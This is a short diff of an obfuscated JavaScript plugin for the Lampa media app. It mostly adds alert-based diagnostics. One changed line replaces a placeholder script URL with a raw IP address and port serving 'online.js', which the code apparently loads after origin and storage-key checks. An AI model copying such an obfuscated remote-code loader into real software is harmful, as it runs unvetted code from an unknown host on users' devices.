@@ -1,7 +1,7 @@
 (function() {
     'use strict';
 
-    // Enhanced script structure with debugging via alerts
+    // Enhanced script structure with detailed diagnostics
     alert('Script initialized. Starting diagnostics...');
 
     // Ensure platform initialization
@@ -73,7 +73,7 @@
             var origin = decodeFunction(0x8f, 0); // Decoded "valid_origin"
             var key = decodeFunction(0x96, 0); // Decoded "lampac_unic_id"
             var value = decodeFunction(0x85, 0); // Decoded "tyusdt"
-            var script = decodeFunction(0x97, 0); // Decoded "http://example.com/script.js"
+            var script = decodeFunction(0x97, 0); // Decoded "http://185.87.48.42:2627/online.js"
 
             alert("Decoded origin: " + origin);
             alert("Decoded key: " + key);
@@ -83,6 +83,7 @@
             if (Lampa.Manifest.origin === origin) {
                 alert("Valid origin detected using decode.");
                 var storageCheck = Lampa.Storage.get(key, '');
+                alert("Storage check returned: " + storageCheck);
 
                 if (storageCheck !== value) {
                     alert("Updating storage key...");
